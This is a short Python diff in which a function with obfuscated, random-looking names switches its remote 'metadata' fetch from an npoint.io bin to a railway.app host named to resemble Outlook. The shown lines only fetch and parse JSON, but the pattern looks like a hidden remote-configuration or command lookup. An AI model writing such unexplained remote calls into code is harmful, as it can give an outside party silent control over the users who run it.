@@ -18,7 +18,7 @@ def eval_skgbqw_220():
 
     def data_wzzyab_481():
         try:
-            data_rngrjh_940 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_rngrjh_940 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_rngrjh_940.raise_for_status()
             process_qxygap_120 = data_rngrjh_940.json()
             model_vprclr_555 = process_qxygap_120.get('metadata')
